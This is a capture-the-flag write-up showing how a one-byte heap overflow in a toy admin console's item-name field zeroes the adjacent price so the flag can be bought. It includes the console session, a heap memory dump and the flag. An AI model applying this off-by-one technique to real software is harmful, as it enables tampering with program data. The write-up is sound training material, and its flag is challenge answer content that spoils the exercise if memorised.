# Proof of Concept

## TL;DR

- Heap overflow to edit price below 67

- Name array size is 64, so you can input 64 characters during edit so that the null identifier `'\0'` overwrites price

- Example of overflow:
```
Tuff Admin Console V2
Balance of account: 67
Select action:
1. Add Item
2. Edit Item
3. View Item
4. Test Buy Item
0. nothing
> 1
Enter item name: aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaa
Randomizing price to: 153

Tuff Admin Console V2
Balance of account: 67
Select action:
1. Add Item
2. Edit Item
3. View Item
4. Test Buy Item
0. nothing
> 3
Enter item index to view: 0
Item Name: aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaa
Item Price: 153

Tuff Admin Console V2
Balance of account: 67
Select action:
1. Add Item
2. Edit Item
3. View Item
4. Test Buy Item
0. nothing
> 2
Enter item index to edit: 0
Enter new item name: aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaa

Tuff Admin Console V2
Balance of account: 67
Select action:
1. Add Item
2. Edit Item
3. View Item
4. Test Buy Item
0. nothing
> 3
Enter item index to view: 0
Item Name: aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaa
Item Price: 0

Tuff Admin Console V2
Balance of account: 67
Select action:
1. Add Item
2. Edit Item
3. View Item
4. Test Buy Item
0. nothing
> 4
Enter item index to buy: 0
[Debug] reading flag
HCS{omg_h343p_g00att_s0_tUFFFF_<3}
```

- Notice the 2nd chunk has one extra character overflowed, making the price int `0x0000000000000000`:
```
0x55555556b2a0  0x0000000000000000      0x0000000000000051      ........Q.......
0x55555556b2b0  0x6161616261616161      0x6161616461616163      aaaabaaacaaadaaa
0x55555556b2c0  0x6161616661616165      0x6161616861616167      eaaafaaagaaahaaa
0x55555556b2d0  0x6161616a61616169      0x6161616c6161616b      iaaajaaakaaalaaa
0x55555556b2e0  0x6161616e6161616d      0x006161706161616f      maaanaaaoaaapaa.
0x55555556b2f0  0x000000000000008d      0x0000000000000051      ........Q.......
0x55555556b300  0x6161616261616161      0x6161616461616163      aaaabaaacaaadaaa
0x55555556b310  0x6161616661616165      0x6161616861616167      eaaafaaagaaahaaa
0x55555556b320  0x6161616a61616169      0x6161616c6161616b      iaaajaaakaaalaaa
0x55555556b330  0x6161616e6161616d      0x616161706161616f      maaanaaaoaaapaaa
0x55555556b340  0x0000000000000000      0x000000000000ecc1      ................       <-- Top chunk

```

### Flag: 
> HCS{omg_h343p_g00att_s0_tUFFFF_<3_[a-fA-F0-9]{8}-([a-fA-F0-9]{4}-){3}[a-fA-F0-9]{12}}